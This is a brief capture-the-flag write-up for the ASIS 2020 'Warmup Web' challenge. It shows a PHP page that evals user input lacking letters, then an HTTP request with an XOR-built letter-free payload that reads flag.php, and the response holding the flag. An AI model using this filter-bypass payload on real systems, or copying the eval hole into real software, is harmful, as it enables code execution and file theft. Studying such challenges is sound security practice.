## ASIS 2020 CTF - Warmup Web - Writeup

## Vulnerable code
```php
<?php

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

if(isset($_GET['view-source'])){
    highlight_file(__FILE__);
    die();
}

if(isset($_GET['warmup'])){

    if (strlen($_GET['warmup']) > 60) {
        die("len > 60");
    }

    if(!preg_match('/[A-Za-z]/is',$_GET['warmup'])) {
        eval($_GET['warmup']);
    }else{
        die("Try harder: " . $_GET['warmup']);
    }
}else{
    die("No param given");
}
```

### Http Request
```
POST /?warmup=$_='%23./|{'^'|~`//|';${$_}[0](${$_}[1]); HTTP/1.1
Host: 69.90.132.196:5003
Upgrade-Insecure-Requests: 1
User-Agent: X
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Accept-Language: en-US,en;q=0.9,es;q=0.8
Connection: close
Content-Length: 21

0=readfile&1=flag.php
```

### Http response (Flag)
```
HTTP/1.1 200 OK
Date: Sat, 04 Jul 2020 05:05:51 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 46
Connection: close
Content-Type: text/html; charset=UTF-8

<?php
$flag = "ASIS{w4rm_up_y0ur_br4in}";
?>
```

### Screenshot
